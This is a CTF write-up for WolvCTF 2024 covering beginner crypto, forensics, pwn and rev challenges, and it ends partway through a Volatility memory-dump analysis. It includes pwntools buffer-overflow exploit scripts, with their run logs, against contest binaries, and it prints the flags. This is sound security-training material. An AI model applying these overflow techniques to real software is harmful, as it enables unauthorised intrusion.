---
title: "Wolv CTF 2024"
description: ""
summary: ""
date: 2024-03-16T06:00:00+07:00
lastmod: 2024-02-18T09:41:00+07:00
draft: false
menu:
  posts:
    parent: ""
    identifier: "wolvctf-2024"
weight: 910
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  noindex: false # false (default) or true
---


[https://ctftime.org/event/2240](https://ctftime.org/event/2240)

<br>
<p align="center">
  <a href="https://wolvctf.io/" target="_blank">
    <img src="https://ctftime.org/media/cache/60/c7/60c7d460bc802aa776313fb15fc1473e.png">
  </a>
</p>

<br>

## CHALL'S SOLVED

| Category  | Challenge                                                     |
| --------- | ------------------------------------------------------------- |
| Beginner  | [Crypto: yORs Truly <3](#crypto-yors-truly-3)                 |
| Beginner  | [Crypto: TwoTimePad](#crypto-twotimepad)                      |
| Beginner  | [Forensics: Hidden Data](#forensics-hidden-data)              |
| Beginner  | [Pwn: babypwn](#pwn-babypwn)                                  |
| Beginner  | [Pwn: babypwn2](#pwn-babypwn2)                                |
| Beginner  | [Rev: babyre](#rev-babyrev)                                   |
| Crypto    | [Limited 1](#limited-1)                                       |
| Forensics | [Eternally Pwned: Infiltration](#eternaly-pwned-infiltration) |
| Forensics | [Eternally Pwned: Persistence](#eternaly-pwned-persistence)   |
| Misc      | [Made Sense](#made-sense)                                     |
| Misc      | [Made Functional](#made-functional)                           |

<br>

## Beginner

### Crypto: yORs Truly <3

<details>
  <summary>Overview</summary>
  
  > Author: shlswnt <br>

  > Description: I have encrypted some text but it seems I have lost the key! Can you find it?  <br>
  
  > Unlock Hint for 0 points: A string of text can be decrypted by merely reapplying the XOR function with the key
  
  [yors-truly.py](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-yORs-Truly/yors-truly.py) <br>

</details>

Given th first chall crypto beginner, this is a classic XOR encryption problem. The plaintext is XORed with a key to get the ciphertext. If we lost the key but have the plaintext and the ciphertext, we can retrieve the key by XORing the plaintext and the ciphertext.

```python {title="yors-truly.py" lineNos=true lineNoStart=1}
import base64

plaintext = "A string of text can be encrypted by applying the bitwise XOR operator to every character using a given key"
key = "" # I have lost the key!

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

ciphertext_b64 = base64.b64encode(byte_xor(key.encode(), plaintext.encode()))

ciphertext_decoded = base64.b64decode("NkMHEgkxXjV/BlN/ElUKMVZQEzFtGzpsVTgGDw==")

print(ciphertext_decoded)
```

Here's how we can modify the code to find the key:

```python {title="solver.py" lineNos=true lineNoStart=1}
import base64

plaintext = "A string of text can be encrypted by applying the bitwise XOR operator to every character using a given key"

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

ciphertext_decoded = base64.b64decode("NkMHEgkxXjV/BlN/ElUKMVZQEzFtGzpsVTgGDw==")

key = byte_xor(plaintext.encode(), ciphertext_decoded)

print(key)
```

This will print the key that was used to encrypt the plaintext.

<details>
  <summary>FLAG</summary>
  
  > `wctf{X0R_i5_f0rEv3r_My_L0Ve}`
    
</details>

<br>

### Crypto: TwoTimePad

<details>
  <summary>Overview</summary>
  
  > Author: cogsworth64 <br>

  > Description: One-time pads are perfectly information-theoretically secure, so I should be safe, right?  <br>
  
  [chall.py](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-TwoTimePad/chall.py) <br>
  [eFlag.bmp](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-TwoTimePad/eFlag.bmp) <br>
  [eWolverine.bmp](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-TwoTimePad/eWolverine.bmp)

</details>

Second challenge crypto beginner is a classic example of the misuse a one-time pad (OTP). Called `TwoTimePad` is a hint towards this. The key should be random, secret, and never reused. However in this challenge, the same key is used to encrypt two different encrypted files (`eWolverine.bmp` & `eFlag.bmp`).

```python {title="chall.py" lineNos=true lineNoStart=1}
from Crypto.Random import random, get_random_bytes

BLOCK_SIZE = 16

with(open('./genFiles/wolverine.bmp', 'rb')) as f:
    wolverine = f.read()
with(open('./genFiles/flag.bmp', 'rb')) as f:
    flag = f.read()

w = open('eWolverine.bmp', 'wb')
f = open('eFlag.bmp', 'wb')

f.write(flag[:55])
w.write(wolverine[:55])

for i in range(55, len(wolverine), BLOCK_SIZE):
    KEY = get_random_bytes(BLOCK_SIZE)
    w.write(bytes(a^b for a, b in zip(wolverine[i:i+BLOCK_SIZE], KEY)))
    f.write(bytes(a^b for a, b in zip(flag[i:i+BLOCK_SIZE], KEY)))
```

The headers of the BMP files contain important information such as the size, color depth, compression method, etc. In the provided Python script, the headers of the original images are preserved. However, if we XOR the two encrypted images together, the headers are also XOR-ed.

Then, we need to XOR the two encrypted images together. Since the same key was used for both, this will effectively cancel out the key, leaving with the XOR of the two original images.

```python {title="solver.py" lineNos=true lineNoStart=1}
HEADER_SIZE = 55  # Size of the BMP header

with open('eWolverine.bmp', 'rb') as f:
    eWolverine = f.read()
with open('eFlag.bmp', 'rb') as f:
    eFlag = f.read()

header = eWolverine[:HEADER_SIZE]

xor = header + bytes(a^b for a, b in zip(eWolverine[HEADER_SIZE:], eFlag[HEADER_SIZE:]))

with open('out.bmp', 'wb') as f:
    f.write(xor)
```

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Beginner-TwoTimePad/out.bmp" width="300">
</div>
<br>

<details>
  <summary>FLAG</summary>
  
  > `wctf{D0NT_R3CYCLE_K3Y5}`
    
</details>

<br>

### Forensics: Hidden Data

<details>
  <summary>Overview</summary>
  
  > Author: dree_ <br>

  > Description: WOLPHV sent me this file. Not sure what to comment about it <br>
  
  [wctf_evil.jpg](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/forensics-hidden-data/wctf_evil.jpg)

</details>

Given an image file of Wolv CTF logo, 

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Beginner-Hidden-Data/wctf_evil.jpg" width="300">
</div>
<br>

I was assumed there's a flag on the metadata or like LSB hidden-data, and if we take look at the metada of it, we can find the flag instantly in `Comment` tag

```bash
$ exiftool wctf_evil.jpg
ExifTool Version Number         : 12.40
File Name                       : wctf_evil.jpg
Directory                       : .
File Size                       : 11 KiB
File Modification Date/Time     : 2024:03:15 17:23:14+07:00
File Access Date/Time           : 2024:03:18 05:44:58+07:00
File Inode Change Date/Time     : 2024:03:16 11:14:42+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}
Image Width                     : 250
Image Height                    : 307
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 250x307
Megapixels                      : 0.077
```

```bash
$ file wctf_evil.jpg
wctf_evil.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}", progressive, precision 8, 250x307, components 3
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{h1dd3n_d4t4_n0T_s0_h1dD3N}`
    
</details>

<br>

### Pwn: babypwn

<details>
  <summary>Overview</summary>
  
  > Author: iqlusion <br>

  > Description: Just a little baby pwn. <br>

  > Connection: `nc babypwn.wolvctf.io 1337`
  
  [babypwn](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-babypwn/babypwn) <br>
  [babypwn.c](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-babypwn/babypwn.c)

</details>

Given two attachments of this challenge `babypwn` & `babypwn.c`, is a baby bof (buffer overflow) vulnerability. 

```bash {title="determine file type & check binary elf protection"}
$ file babypwn
babypwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec babypwn
[*] '/home/nopedawn/CCUG/WolvCTF24/babypwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```c {title="babypwn.c" lineNos=true lineNoStart=1}
#include <stdio.h>
#include <string.h>
#include <unistd.h>

struct __attribute__((__packed__)) data {
  char buff[32];
  int check;
};

void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
  char flag[1024] = { 0 };
  FILE *fp = fopen("flag.txt", "r");
  fgets(flag, 1023, fp);
  printf(flag);
}

int main(void) 
{
  struct data name;
  ignore(); /* ignore this function */

  printf("What's your name?\n");
  fgets(name.buff, 64, stdin);
  sleep(2);
  printf("%s nice to meet you!\n", name.buff);
  sleep(2);
  printf("Binary exploitation is the best!\n");
  sleep(2);
  printf("Memory unsafe languages rely on coders to not make mistakes.\n");
  sleep(2);
  printf("But I don't worry, I write perfect code :)\n");
  sleep(2);

  if (name.check == 0x41414141) {
    get_flag();
  }

  return 0;
}
```

The `fgets` function in the `main` function reads 64 bytes into `name.buff`, which is only 32 bytes long. This can lead to an overflow of the `check` variable if more than 32 bytes are entered.

To exploit this, we need to enter 32 bytes to fill up the `buff` array, and then 4 more bytes to overwrite the `check` variable with the value `0x41414141`. Here's an solver:

```python {title="solver.py" lineNos=true lineNoStart=1}
from pwn import *

def exploit(io):
    io.recvuntil(b"What's your name?")

    payload = b'A' * 32
    payload += p32(0x41414141)
    io.sendline(payload)

    # output = io.recvall()
    # print(output)
    io.interactive()

if __name__ == "__main__":
    context.update(log_level='debug')
    try:
        io = remote('babypwn.wolvctf.io', 1337)
        exploit(io)
    except:
        io = process('./babypwn')
        exploit(io)
```

```bash {title="running"}
$ python3 solver.py
[+] Opening connection to babypwn.wolvctf.io on port 1337: Done
[DEBUG] Received 0x1e bytes:
    b'== proof-of-work: disabled ==\n'
[DEBUG] Received 0x12 bytes:
    b"What's your name?\n"
[DEBUG] Sent 0x25 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[*] Switching to interactive mode

[DEBUG] Received 0x38 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
    b' nice to meet you!\n'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 nice to meet you!
[DEBUG] Received 0x21 bytes:
    b'Binary exploitation is the best!\n'
Binary exploitation is the best!
[DEBUG] Received 0x3d bytes:
    b'Memory unsafe languages rely on coders to not make mistakes.\n'
Memory unsafe languages rely on coders to not make mistakes.
[DEBUG] Received 0x2b bytes:
    b"But I don't worry, I write perfect code :)\n"
But I don't worry, I write perfect code :)
[DEBUG] Received 0x20 bytes:
    b'wctf{pwn_1s_th3_best_Categ0ry!}\n'
wctf{pwn_1s_th3_best_Categ0ry!}
[*] Got EOF while reading in interactive
$ q
[DEBUG] Sent 0x2 bytes:
    b'q\n'
$ q
[DEBUG] Sent 0x2 bytes:
    b'q\n'
[*] Closed connection to babypwn.wolvctf.io port 1337
[*] Got EOF while sending in interactive
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{pwn_1s_th3_best_Categ0ry!}`
    
</details>

<br>

### Pwn: babypwn2

<details>
  <summary>Overview</summary>
  
  > Author: retu2libc <br>

  > Description: A harder babypwn. <br>

  > Connection: `nc babypwn2.wolvctf.io 1337`
  
  [babypwn2](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-babypwn2/babypwn2) <br>
  [babypwn2.c](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-babypwn2/babypwn2.c)

</details>

The second one is `babypwn2`

```bash {title="determine file type & check binary elf protection"}
$ file babypwn2 && checksec babypwn2
babypwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
[*] '/home/nopedawn/CCUG/WolvCTF24/babypwn2/babypwn2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```c {title="babypwn2.c" lineNos=true lineNoStart=1}
#include <stdio.h>
#include <unistd.h>

/* ignore this function */
void ignore()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag() 
{
    char *args[] = {"/bin/cat", "flag.txt", NULL};
    execve(args[0], args, NULL);
}

int main() 
{
    ignore();
    char buf[0x20];
    printf("What's your name?\n>> ");
    gets(buf);
    printf("Hi %s!\n", buf);
    return 0;
}
```

The `gets` function is dangerous because it does not check the size of the input, which can lead to a buffer overflow. In this case, the buffer `buf` is of size `0x20` (32 bytes), but `gets` will write past the end of the buffer if given an input larger than 32 bytes.

```bash {title="find get_flag address" hl_lines=["18"]}
$ gdb ./babypwn2

gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  printf@plt
0x0000000000401040  execve@plt
0x0000000000401050  gets@plt
0x0000000000401060  setvbuf@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  ignore
0x0000000000401195  get_flag
0x00000000004011d0  main
0x0000000000401220  __libc_csu_init
0x0000000000401280  __libc_csu_fini
0x0000000000401284  _fini
gef➤
```

The goal here is to overwrite the return address of the `main` function with the address of the `get_flag` function. This can be done by sending an input of 32 bytes (to fill up the buffer) plus the size of the saved base pointer (usually 8 bytes on a 64-bit system), followed by the address of the `get_flag` function.

```python {title="solver.py" lineNos=true lineNoStart=1}
from pwn import *

def exploit(io):
    io.recvuntil(b"What's your name?")

    get_flag_address = 0x401195

    payload = b'A' * 32
    payload += b'B' * 8
    payload += p64(get_flag_address)
    io.sendline(payload)

    # output = io.recvall()
    # print(output)
    io.interactive()

if __name__ == "__main__":
    context.update(log_level='debug')
    try:
        io = remote('babypwn2.wolvctf.io', 1337)
        exploit(io)
    except:
        io = process('./babypwn2')
        exploit(io)
```

```bash {title="running"}
$ python3 solver.py
[+] Opening connection to babypwn2.wolvctf.io on port 1337: Done
[DEBUG] Received 0x1e bytes:
    b'== proof-of-work: disabled ==\n'
[DEBUG] Received 0x15 bytes:
    b"What's your name?\n"
    b'>> '
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  42 42 42 42  42 42 42 42  95 11 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode

>> [DEBUG] Received 0x52 bytes:
    00000000  48 69 20 41  41 41 41 41  41 41 41 41  41 41 41 41  │Hi A│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 42  42 42 42 42  42 42 42 95  11 40 21 0a  │AAAB│BBBB│BBB·│·@!·│
    00000030  77 63 74 66  7b 57 6f 34  68 5f 6c 30  6f 6b 5f 34  │wctf│{Wo4│h_l0│ok_4│
    00000040  74 5f 79 30  75 5f 68 34  63 6b 31 6e  67 5f 6d 33  │t_y0│u_h4│ck1n│g_m3│
    00000050  7d 0a                                               │}·│
    00000052
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x95\x11@!
wctf{Wo4h_l0ok_4t_y0u_h4ck1ng_m3}
[*] Got EOF while reading in interactive
$ q
[DEBUG] Sent 0x2 bytes:
    b'q\n'
$ q
[DEBUG] Sent 0x2 bytes:
    b'q\n'
[*] Closed connection to babypwn2.wolvctf.io port 1337
[*] Got EOF while sending in interactive
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{Wo4h_l0ok_4t_y0u_h4ck1ng_m3}`
    
</details>

<br>

### Rev: babyre

<details>
  <summary>Overview</summary>
  
  > Author: iqlusion <br>

  > Description: Just a wee-little baby re challenge. <br>
  
  [babyre](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Beginner-babyre/babyre)

</details>

The next beginner challenge is Rev called `babyre`

```bash {title="prompt"}
$ ./babyre
How are you today?
I'm good
Not sure how to react to that :/
Did you checkout our cool sponsors?
You should totally check them out!
I think I am forgetting something...
Oh yea the flag!
But where did I put it...
I know its in here somewhere.
Dratts! Can you help me find it?
I swear its around here somewhere.
```

We can check on dissasembler like IDA Pro in strings segments

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Beginner-babyre/ida-view.png">
</div>
<br>

or simply strings it, we can get the flag

```bash
$ strings babyre | grep wctf
wctf{n1c3_oNe_y0u_Found_m3}
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{n1c3_oNe_y0u_Found_m3}`
    
</details>

<br>
<hr>

## Crypto

### Limited 1

<details>
  <summary>Overview</summary>
  
  > Author: catgut6675 <br>

  > Description: It's pretty easy to find random integers if you know the seed, but what if every second has a different seed? <br>
  
  [chal_time.py](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Limited1/chal_time.py)

</details>

```python {title="chal_time.py" lineNos=true lineNoStart=1}
import time
import random
import sys

if __name__ == '__main__':
    flag = input("Flag? > ").encode('utf-8')
    correct = [189, 24, 103, 164, 36, 233, 227, 172, 244, 213, 61, 62, 84, 124, 242, 100, 22, 94, 108, 230, 24, 190, 23, 228, 24]
    time_cycle = int(time.time()) % 256
    if len(flag) != len(correct):
        print('Nope :(')
        sys.exit(1)
    for i in range(len(flag)):
        random.seed(i+time_cycle)
        if correct[i] != flag[i] ^ random.getrandbits(8):
            print('Nope :(')
            sys.exit(1)
    print(flag)
```

The given Python script that uses the current time as a seed for the random number generator. The script then checks if the XOR of each character in the flag with a random 8-bit number equals the corresponding number in the `correct` list. If all checks pass, the flag is printed.

To do that, we need to reverse the process. Here's the solver:

```python {title="solver.py" lineNos=true lineNoStart=1}
import random

correct = [189, 24, 103, 164, 36, 233, 227, 172, 244, 213, 61, 62, 84, 124, 242, 100, 22, 94, 108, 230, 24, 190, 23, 228, 24]

for time_cycle in range(256):
    flag = ""
    for i in range(len(correct)):
        random.seed(i+time_cycle)
        char = correct[i] ^ random.getrandbits(8)
        flag += chr(char)
        
    if all(' ' <= c <= '~' for c in flag):
        print(f"time_cycle: {time_cycle}\nflag: {flag} ")
```

```bash
$ python3 solver.py
time_cycle: 188
flag: wctf{f34R_0f_m1ss1ng_0ut}
```

<details>
  <summary>FLAG</summary>
  
  > `wctf{f34R_0f_m1ss1ng_0ut}`
    
</details>

<br>
<hr>

## Forensics

### Eternally Pwned: Infiltration

<details>
  <summary>Overview</summary>
  
  > Author: dree_ <br>

  > Description: I recently had my passwords and other sensitive data leaked, but I have no idea how. Can you figure out how the attacker got in to my PC? <br>
  
  [network-capture.pcap](https://github.com/nopedawn/CTF/blob/main/WolvCTF24/Infiltration/network-capture.pcap)

</details>

Given the forensics challenge, we need to investigate data for evidence of network packet capture `network-capture.png`

We can investigate with Wireshark and analyze the every packet bytes, if we filter the most interraction is on `tcp` protocol & `smb` protocol. Both we're gonna focusing on (`tcp` / `smb`) packet interraction.

If we filter the packet in number `446` & `550` 

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Infiltration/packet-no-446.png">
</div>
<br>

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Infiltration/packet-no-550.png">
</div>
<br>

or filter `tcp.stream eq 4` (both are same filtering)

<br>
<div style="text-align:center">
<img src="https://raw.githubusercontent.com/nopedawn/CTF/main/WolvCTF24/Infiltration/packet-view.png">
</div>
<br>

We can see the bunch of "A" characters, and if wee look closely there's look like a base64 string between the "A" characters

Note that we have found these, next we can grep the base64 string or using tshark

```bash
$ tshark -r network-capture.pcap -Y "frame.number == 446" -x
0000  00 0c 29 ce 19 19 00 0c 29 95 a9 e6 08 00 45 00   ..).....).....E.
0010  00 6d bc 93 40 00 40 06 f5 95 c0 a8 03 85 c0 a8   .m..@.@.........
0020  03 8c b6 f1 01 bd 3f d8 46 5d d3 e1 93 41 80 18   ......?.F]...A..
0030  00 f9 b7 6e 00 00 01 01 08 0a 48 40 d9 94 00 00   ...n......H@....
0040  72 c3 00 00 00 35 ff 53 4d 42 2b 00 00 00 00 18   r....5.SMB+.....
0050  01 60 00 00 00 00 00 00 00 00 00 00 00 00 00 00   .`..............
0060  00 00 00 08 00 00 01 01 00 10 00 64 32 4e 30 5a   ...........d2N0Z
0070  6e 74 73 4d 33 52 54 58 77 3d 3d                  ntsM3RTXw==

$ echo "d2N0ZntsM3RTXw==" | base64 -d
wctf{l3tS_
```

We've got the first part `wctf{l3tS_`

```bash
$ tshark -r network-capture.pcap -Y "frame.number == 550" -x

0d20  41 41 41 41 4d 33 52 6c 55 6d 34 30 62 45 78 35   AAAAM3RlUm40bEx5
0d30  58 32 63 77 58 77 3d 3d 41 41 41 41 41 41 41 41   X2cwXw==AAAAAAAA

0f20  41 41 41 41 41 41 41 41 41 41 41 41 59 6b 78 56   AAAAAAAAAAAAYkxV
0f30  4d 31 38 33 62 6a 6c 33 62 54 52 70 56 32 35 4d   M183bjl3bTRpV25M
0f40  66 51 3d 3d 41 41 41 41 41 41 41 41 41 41 41 41   fQ==AAAAAAAAAAAA

$ echo "M3RlUm40bEx5X2cwXw==" | base64 -d
3teRn4lLy_g0_

$ echo "YkxVM183bjl3bTRpV25MfQ==" | base64 -d
bLU3_7n9wm4iWnL}
```

then the two last part `3teRn4lLy_g0_` & `bLU3_7n9wm4iWnL}`

<details>
  <summary>FLAG</summary>
  
  > `wctf{l3tS_3teRn4lLy_g0_bLU3_7n9wm4iWnL}`
    
</details>

<br>

### Eternally Pwned: Persistence

<details>
  <summary>Overview</summary>
  
  > Author: dree_ <br>

  > Description: I get that the attackers were in my PC, but how did they achieve persistence? <br>

  [MEMORY.DMP](https://drive.usercontent.google.com/download?id=19kx1J7rTkck3EswVd42ZiQUr2sBo-s2J&export=download)

</details>

The next forensics challenge is `Persistence`, that we have to investigate the dump of memory unknown profile

So we can use `strings` or another method to determine some profile informations like trying this examples:

> `$ strings MEMORY.DMP | grep "notepad"`
> 
> `$ strings MEMORY.DMP | grep "microsoft"`
> 
> `$ strings MEMORY.DMP | grep "windows"`

(a bit ridiculous, but helpful 🗿)

Note that we have already know this is a dump of windows, so we can retrieve the information of it with `Volatility 3`

```bash {title="windows.info"}
$ volatility3 -f MEMORY.DMP windows.info
Volatility 3 Framework 2.5.0
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0xf80001852000
DTB     0x187000
Symbols file:///home/nopedawn/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/3844DBB920174967BE7AA4A2C20430FA-2.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 WindowsCrashDump64Layer
base_layer      2 FileLayer
KdDebuggerDataBlock     0xf80001a430a0
NTBuildLab      7601.17514.amd64fre.win7sp1_rtm.
CSDVersion      1
KdVersionBlock  0xf80001a43068
Major/Minor     15.7601
MachineType     34404
KeNumberProcessors      1
SystemTime      2024-03-09 12:05:40
NtSystemRoot    C:\Windows
NtProductType   NtProductServer
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      34404
PE TimeDateStamp        Sat Nov 20 09:30:02 2010
```

See! It's a dump of windows, now we can retrieve the information of process are running

```bash {title="windows.pstree"}
$ volatility3 -f MEMORY.DMP windows.pstree
Volatility 3 Framework 2.5.0
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime

4       0       System  0xfa8018d8db30  71      497     N/A     False   2024-03-09 11:47:48.000000      N/A
* 224   4       smss.exe        0xfa8019c06310  2       29      N/A     False   2024-03-09 11:47:48.000000      N/A
296     288     csrss.exe       0xfa801a39a750  9       341     0       False   2024-03-09 11:47:49.000000      N/A
348     288     wininit.exe     0xfa801a3b8b30  4       77      0       False   2024-03-09 11:47:49.000000      N/A
* 468   348     lsm.exe 0xfa801a40eb30  11      144     0       False   2024-03-09 11:47:49.000000      N/A
* 460   348     lsass.exe       0xfa801a4083b0  8       569     0       False   2024-03-09 11:47:49.000000      N/A
* 444   348     services.exe    0xfa801a3ff5f0  9       200     0       False   2024-03-09 11:47:49.000000      N/A
** 640  444     svchost.exe     0xfa801a54bb30  9       243     0       False   2024-03-09 11:47:50.000000      N/A
** 1536 444     spoolsv.exe     0xfa801a93fb30  13      254     0       False   2024-03-09 11:56:05.000000      N/A
** 908  444     svchost.exe     0xfa801a5ccb30  8       197     0       False   2024-03-09 11:47:50.000000      N/A
*** 1304        908     dwm.exe 0xfa801a75a060  4       66      1       False   2024-03-09 11:47:51.000000      N/A
** 1040 444     svchost.exe     0xfa801a6d0060  4       46      0       False   2024-03-09 11:47:51.000000      N/A
** 2040 444     mscorsvw.exe    0xfa801a85db30  8       84      0       True    2024-03-09 11:49:52.000000      N/A
** 1956 444     sppsvc.exe      0xfa801a87f4f0  5       151     0       False   2024-03-09 11:47:59.000000      N/A
** 812  444     svchost.exe     0xfa801a5a49e0  34      953     0       False   2024-03-09 11:47:50.000000      N/A
** 1200 444     taskhost.exe    0xfa801a722b30  6       117     1       False   2024-03-09 11:47:51.000000      N/A
** 692  444     svchost.exe     0xfa801a5645f0  14      288     0       False   2024-03-09 11:47:50.000000      N/A
** 948  444     svchost.exe     0xfa801a5dc5f0  17      441     0       False   2024-03-09 11:47:50.000000      N/A
** 1332 444     mscorsvw.exe    0xfa801a705060  8       75      0       False   2024-03-09 11:49:52.000000      N/A
** 312  444     spoolsv.exe     0xfa801a6a6670  0       -       0       False   2024-03-09 11:47:51.000000      2024-03-09 11:55:05.000000
** 1852 444     msdtc.exe       0xfa8018e3e620  13      142     0       False   2024-03-09 11:49:53.000000      N/A
** 576  444     svchost.exe     0xfa801a521b30  12      348     0       False   2024-03-09 11:47:50.000000      N/A
*** 1848        576     WmiPrvSE.exe    0xfa801a500a10  7       118     0       False   2024-03-09 12:04:55.000000      N/A
*** 2052        576     WmiPrvSE.exe    0xfa801990fb30  9       248     0       False   2024-03-09 12:04:56.000000      N/A
** 1992 444     svchost.exe     0xfa801a46c220  6       67      0       False   2024-03-09 11:49:53.000000      N/A
** 860  444     svchost.exe     0xfa801a5c05a0  11      273     0       False   2024-03-09 11:47:50.000000      N/A
** 1380 444     svchost.exe     0xfa801a78e730  6       99      0       False   2024-03-09 11:47:52.000000      N/A
** 240  444     svchost.exe     0xfa801a41d060  18      295     0       False   2024-03-09 11:47:50.000000      N/A
** 2168 444     TrustedInstall  0xfa801a4fab30  7       223     0       False   2024-03-09 12:04:57.000000      N/A
360     340     csrss.exe       0xfa801a3bf060  7       266     1       False   2024-03-09 11:47:49.000000      N/A
* 988   360     conhost.exe     0xfa801a85e1d0  2       38      1       False   2024-03-09 11:49:15.000000      N/A
* 1868  360     conhost.exe     0xfa801a4a8630  2       38      1       False   2024-03-09 11:50:05.000000      N/A
408     340     winlogon.exe    0xfa801a3f75c0  4       97      1       False   2024-03-09 11:47:49.000000      N/A
1320    1292    explorer.exe    0xfa801a7637c0  30      712     1       False   2024-03-09 11:47:52.000000      N/A
* 896   1320    multireader.ex  0xfa801a8601d0  2       57      1       False   2024-03-09 11:54:50.000000      N/A
* 804   1320    cmd.exe 0xfa801a496450  1       21      1       False   2024-03-09 11:50:05.000000      N/A
* 1644  1320    notepad.exe     0xfa801a4ba060  1       57      1       False   2024-03-09 11:52:04.000000      N/A
* 1804  1320    cGFzdGViaW4uY2  0xfa801a8de800  8       258     1       False   2024-03-09 11:54:49.000000      N/A
* 1680  1320    cmd.exe 0xfa801a862060  1       19      1       False   2024-03-09 11:49:15.000000      N/A
* 1272  1320    iexplore.exe    0xfa801a983b30  11      381     1       True    2024-03-09 11:55:44.000000      N/A
** 1284 1272    iexplore.exe    0xfa801a503b30  16      348     1       True    2024-03-09 11:55:45.000000      N/A
2568    2492    taskmgr.exe     0xfa801ac2db30  7       124     1       False   2024-03-09 12:05:33.000000      N/A
```

I see there is a strange process running on `PID: 1804`, look like base64 `cGFzdGViaW4uY2`

```bash
$ echo "cGFzdGViaW4uY2" | base64 -d
pastebin.c
```

Hmm, A pastebin running on windows? What about the command-line dump history?

```bash
$ volatility3 -f MEMORY.DMP windows.cmdline
Volatility 3 Framework 2.5.0
Progress:  100.00               PDB scanning finished
PID     Process Args

4       System  Required memory at 0x20 is not valid (process exited?)
224     smss.exe        \SystemRoot\System32\smss.exe
296     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
348     wininit.exe     wininit.exe
360     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
